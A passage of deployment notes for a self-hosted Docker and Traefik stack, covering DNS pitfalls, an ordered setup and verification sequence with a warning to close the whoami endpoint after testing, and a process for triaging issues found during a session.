Recorded so they are not mistaken for them later:

- **Split-DNS pointed at the wrong host.** A wildcard zone resolved to a
  different machine's tailnet address, so the dashboard was unreachable before
  the record was corrected. Environment, not blueprint.
- **Browser DNS cache.** After the record was fixed, Chrome kept serving the old
  answer; an incognito window worked immediately. Worth a line in the operator
  documentation, because it presents identically to a broken access policy.

---

## The sequence that actually worked

Recorded step by step because the documented order is not quite this, and because
this is the raw material for both the operator documentation and the site. Real
hostnames and addresses are replaced with `example.com` throughout.

**Preconditions on the host:** Debian 13, Docker 29.3.1, Compose v5.1.1, a user in
the `docker` and `sudo` groups, ports 80 and 443 free.

1. **Clone into its own directory.** Not over an existing checkout — an old clone
   on the same machine will have stale configuration and a matching
   `COMPOSE_PROJECT_NAME`, which makes Compose adopt and recreate the *running*
   containers of the older deployment rather than starting beside them.
2. **Enable IPv6 in the Docker daemon before anything starts.** Requires a daemon
   restart, so doing it while nothing runs costs nothing and doing it later costs
   an outage of every stack.
3. **Fill `core/traefik/.env`** — domain, ACME email, DNS API token, and both
   `PUBLIC_NETWORK_SUBNET_*`. Generate the ULA prefix rather than copying the
   example; the repository ships the command for it.
4. **`bash ops/scripts/validate.sh`** → **`render.sh`** → **`validate.sh`** again.
   The second pass catches unresolved placeholders and is worth the ten seconds.
5. **Start with the overlay**, not without it:
   `docker compose -f docker-compose.yml -f network-dual-stack.yml up -d`.
6. **Verify before moving on**, in this order — each answers a different question:
   - `docker compose ps` — did it come up healthy
   - `docker network inspect proxy-public` — two subnets, so dual-stack is live
   - certificate present and covering the wildcard
   - `ss -tlnp` — listening on both `0.0.0.0` and `[::]`
   - **`core/whoami` with `acc-public`, then read `X-Real-Ip`** — this is the only
     step that proves the real client IP survives, and it must be repeated once
     per path: public IPv4, public IPv6, and through the VPN

   **Then close whoami again.** It echoes the container hostname, the internal
   container addresses and the ULA prefix — reconnaissance material for anyone
   who finds it. `acc-public` is correct for the duration of the measurement and
   wrong the minute after; the repository default is `acc-tailscale` for this
   reason. On the host used here, scanners were probing WordPress and debug paths
   within minutes of the first certificate being issued.

Step 6 is the one that cannot be skipped. Everything before it proves the
configuration parses; only this proves the deployment behaves.

## Testing capabilities available for later blocks

Noted so the plan can use them rather than working around them:

- **Tailnet access** to the host, so VPN-only policies can be exercised for real
  instead of inferred.
- **A browser with exit nodes in several countries.** This makes the geoblocking
  guidance in `core/crowdsec/docs/` testable end to end — country rules, the
  self-lockout trap, and whether an allowlist behaves as documented — rather than
  reviewed on paper. Worth scheduling deliberately when CrowdSec comes up.

## How this list gets resolved

Not every entry deserves a change, and deciding that during the session would
bias toward whatever was annoying at the time. The rule:

1. **During the session — record, do not fix.** Anything not blocking the next
   step gets written down and left alone. Fixing as you go loses the thread and
   makes the cause of the next failure ambiguous.
2. **After the session — one review pass over the whole list.** Per entry: is it a
   defect, a documentation gap, or an environment quirk that was mistaken for one?
3. **Then split by audience.** A maintainer-facing fix belongs in the repository.
   An operator-facing one belongs on the site, in the words of someone who has not
   read the source.
4. **Only then write anything.** Entries that survive all four become issues; the
   rest stay here as the record of what was considered and dropped, which is worth
   as much as the changes.
